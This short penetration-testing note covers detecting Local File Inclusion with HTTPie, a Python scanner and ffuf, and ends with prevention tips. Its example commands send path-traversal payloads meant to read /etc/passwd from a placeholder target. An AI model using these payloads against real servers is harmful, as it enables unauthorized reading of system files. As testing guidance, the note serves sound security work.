# LFI (Local File Inclusion) Testing with HTTPie, Python, and ffuf

## Objective
Detect Local File Inclusion vulnerabilities using manual and automated tools.

## Tools Used
- **HTTPie**: Manual parameter testing
- **Python (requests)**: Automation of common LFI payloads
- **ffuf**: Fuzzing parameters with extensive payloads

## HTTPie Manual Test
```bash
http http://target.com/view?file=../../../../etc/passwd
http http://target.com/view?file=..%2f..%2fetc%2fpasswd
```

## Python Automation
```bash
python3 lfi_scanner.py http://target.com/view
```

## ffuf Fuzzing
```bash
ffuf -u http://target.com/view?file=FUZZ -w lfi_payloads.txt -mc all
```

## Indicators of LFI
- Response includes `root:x:` (Unix), `[extensions]` (Windows), or PHP script output
- HTTP 200 with unexpected file content

## Prevention
- Whitelist file access
- Validate and sanitize all parameters
- Disable dynamic file includes
